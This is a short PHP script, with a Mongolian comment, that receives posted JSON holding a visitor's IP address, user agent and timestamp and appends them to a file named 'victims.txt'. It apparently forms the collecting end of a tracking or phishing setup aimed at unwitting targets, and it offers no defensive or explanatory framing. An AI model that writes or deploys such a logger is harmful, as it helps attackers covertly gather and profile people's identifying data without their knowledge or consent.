<?php
$data = json_decode(file_get_contents("php://input"), true);

$ip = $data['ip'];
$ua = $data['ua'];
$time = $data['time'];

// Файл руу хадгалах
file_put_contents("victims.txt", "IP: $ip | Device: $ua | Time: $time\n", FILE_APPEND);
?>